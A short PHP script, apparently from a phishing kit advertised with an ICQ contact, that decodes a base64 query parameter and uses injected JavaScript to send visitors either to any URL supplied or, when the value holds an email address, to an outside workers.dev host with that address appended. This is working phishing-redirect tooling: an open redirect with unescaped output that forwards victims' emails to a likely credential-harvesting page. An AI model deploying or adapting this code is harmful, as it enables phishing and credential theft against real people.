<?php
/* New Wildcard 2022 - Need help? Contact me - ICQ: @anyhopes */
@session_start();
error_reporting(0);
$get = $_GET['q'];
$data = base64_decode($get);
if (preg_match("(http|https)",$data)){
	echo "<script type=\"text/javascript\">window.location.href = \"$data\" </script>\n";
}
elseif(preg_match("(@)", $data)){
	echo "<script type=\"text/javascript\">window.location.href = \"https://e3c3b434.4410742ef849df891f3fadcd.workers.dev/?qrc=$data\"</script>\n";
} else {
    echo "<script type=\"text/javascript\">window.location.href = \"https://e3c3b434.4410742ef849df891f3fadcd.workers.dev/?qrc=$get\"</script>\n";
}
?>
